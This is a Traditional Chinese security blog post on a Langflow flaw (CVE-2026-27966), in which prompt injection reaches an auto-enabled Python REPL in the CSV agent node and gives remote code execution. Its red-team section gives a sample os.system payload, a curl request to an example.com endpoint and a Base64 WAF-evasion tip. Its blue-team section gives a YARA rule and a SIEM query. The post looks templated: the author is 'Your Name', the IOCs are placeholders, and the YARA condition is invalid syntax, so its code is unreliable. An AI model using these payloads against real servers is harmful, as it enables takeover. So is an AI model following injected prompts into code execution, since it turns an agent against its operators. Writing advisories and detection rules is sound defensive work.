---
layout: post
title:  "低程式碼AI平臺Langflow存在遠端RCE漏洞，提示詞注入可致伺服器遭遠端接管"
date:   2026-03-04 06:38:48 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Langflow CSV 代理節點漏洞：CVE-2026-27966
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Python REPL`, `LangChain`, `CSV 代理節點`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Langflow 平臺的 CSV 代理節點預設配置疏失，允許執行危險程式碼的參數強制寫死為開啟狀態。這個設定原本是為了讓 AI 代理能夠靈活處理與運算試算表資料，但卻連帶自動啟用了 LangChain 框架底層的 Python REPL 工具。
* **攻擊流程圖解**: 
    1. 攻擊者建構包含特定惡意指令的對話提示詞。
    2. Langflow 伺服器接收到提示詞後，將其視為合法指令並輸入至互動式直譯器。
    3. 惡意指令被執行，攻擊者可以輕易寫入檔案、讀取機密資料，甚至完全接管伺服器底層的作業系統環境。
* **受影響元件**: Langflow 1.6.9 之前的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 無需任何系統特權或內部帳號。
* **Payload 建構邏輯**:

    ```
    
    python
    # 範例 Payload
    payload = {
        "prompt": "import os; os.system('ls -l')"
    }
    
    ```
    * **範例指令**: 使用 `curl` 發送 HTTP 請求：

```

bash
curl -X POST \
  http://example.com/langflow/api/execute \
  -H 'Content-Type: application/json' \
  -d '{"prompt": "import os; os.system(\'ls -l\')"}'

```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 Base64 編碼的 Payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | /langflow/api/execute |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Langflow_CVE_2026_27966 {
        meta:
            description = "Detects Langflow CVE-2026-27966 exploitation"
            author = "Your Name"
        strings:
            $prompt = "import os; os.system"
        condition:
            $prompt in (http.request.body | strings)
    }
    
    ```
    * **SIEM 查詢語法** (Splunk/Elastic):

    ```
    
    sql
    index=langflow_api sourcetype=http_request body="import os; os.system"
    
    ```
* **緩解措施**: 除了更新修補之外，還可以在使用者介面上提供明確的控管機制，且預設值必須為關閉狀態。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Python REPL**: Python 的互動式直譯器，允許用戶在命令列中執行 Python 代碼。
* **LangChain**: 一個基於 Python 的框架，提供了一個簡單的方式來建立和管理 AI 代理。
* **CSV 代理節點**: 一種代理節點，允許用戶將 CSV 檔案與 AI 代理整合。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/174171)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


